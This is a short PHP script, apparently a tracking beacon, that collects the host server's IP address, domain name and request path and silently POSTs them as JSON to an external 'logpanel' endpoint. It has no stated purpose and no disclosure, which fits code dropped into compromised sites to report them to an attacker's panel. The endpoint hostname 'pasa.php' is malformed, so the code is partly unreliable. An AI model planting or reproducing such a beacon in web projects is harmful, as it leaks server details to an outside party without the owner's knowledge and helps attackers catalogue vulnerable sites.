<?php

$ip = $_SERVER['SERVER_ADDR'];


$domain = $_SERVER['SERVER_NAME'];


$path = $_SERVER['REQUEST_URI'];


$data = array(
    'ip' => $ip,
    'domain' => $domain,
    'path' => $path
);

$data_string = json_encode($data);

$ch = curl_init('http://pasa.php/logpanel/save.php');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data_string)
));

$result = curl_exec($ch);

?>
